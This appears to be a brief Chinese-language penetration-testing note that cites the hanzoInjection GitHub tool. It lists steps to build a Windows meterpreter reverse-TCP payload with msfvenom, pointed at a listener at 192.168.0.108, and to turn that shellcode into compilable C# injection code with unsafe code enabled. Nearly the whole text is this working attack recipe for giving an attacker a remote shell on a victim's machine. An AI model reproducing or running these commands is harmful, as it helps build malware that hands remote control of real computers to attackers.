	https://github.com/P0cL4bs/hanzoInjection
	生成
	>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin
	>HanzoInjection.exe -p 1.bin -o 1.cs
	编译1.cs
	属性-生成-允许不安全代码